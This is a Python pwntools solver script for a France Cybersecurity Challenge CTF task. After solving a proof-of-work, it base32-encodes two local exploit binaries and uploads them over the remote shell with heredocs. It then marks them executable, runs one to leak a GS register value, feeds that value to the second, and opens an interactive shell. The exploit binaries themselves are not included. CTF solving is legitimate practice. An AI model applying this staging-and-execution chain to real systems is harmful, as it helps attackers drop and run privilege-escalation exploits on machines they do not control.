import re
import hashlib
from pwn import *
import os
context.log_level = 'error'

HOST = args.HOST or "challenges.france-cybersecurity-challenge.fr"
PORT = int(args.PORT or 2108)


def solve_pow(prefix, difficulty):
    i = 0
    while True:
        i += 1
        suffix = f"{i:032d}"
        randstr = prefix + suffix
        m = hashlib.sha256()
        m.update(randstr.encode())
        h = m.digest()
        bits = "{:0256b}".format(int(h.hex(), 16))
        if bits[:difficulty] == "0" * difficulty:
            return suffix


if __name__ == "__main__":
    io = remote(HOST, PORT)

    # Proof-of-Work solver
    r = io.recvline().strip().decode()
    m = re.findall(r".* SHA256\(([a-zA-Z]+) \|\| S\) starts with (\d+) bits .*", r)
    assert len(m), "Error: could not extract the prefix and difficulty."
    prefix, difficulty = m[0]
    log.info(f"Solving PoW with difficulty {difficulty} and prefix {prefix}")
    suffix = solve_pow(prefix, int(difficulty))
    io.sendlineafter(b">>> ", suffix.encode())
    r = io.recvline().strip().decode()
    assert r == "Valid Proof-of-Work!"

    ##
    ## Put your code here
    ##
    os.system('cat poc | base32 > /tmp/coded')

    io.recvuntil("Enter 'help' for a list of built-in commands.\r\n\r\n",drop=True)
    f = open('/tmp/coded', 'rb')
    buff = f.read()
    f.close()
    io.sendline('cat >/tmp/pipo <<__EOF__')
    io.sendline(buff)
    io.sendline('__EOF__')
    io.recvuntil('__EOF__', drop=True)
    io.sendline('cat /tmp/pipo|base32 -d > /tmp/poc;chmod +x /tmp/poc;')

    os.system('cat working.exploit | base32 > /tmp/coded2')
    f = open('/tmp/coded2', 'rb')
    buff = f.read()
    f.close()
    io.sendline('cat >/tmp/pipo <<__EOF__')
    io.sendline(buff)
    io.sendline('__EOF__')
    io.recvuntil('__EOF__', drop=True)
    io.sendline('cat /tmp/pipo |base32 -d > /tmp/exp;chmod +x /tmp/exp;')

    context.log_level = 'debug'
    io.recv()
    io.sendline('/tmp/poc')
    io.recvuntil(') GS:',drop=True)
    gs = io.recvuntil('(',drop=True)
    io.sendline(b'/tmp/exp '+gs)

    io.interactive()

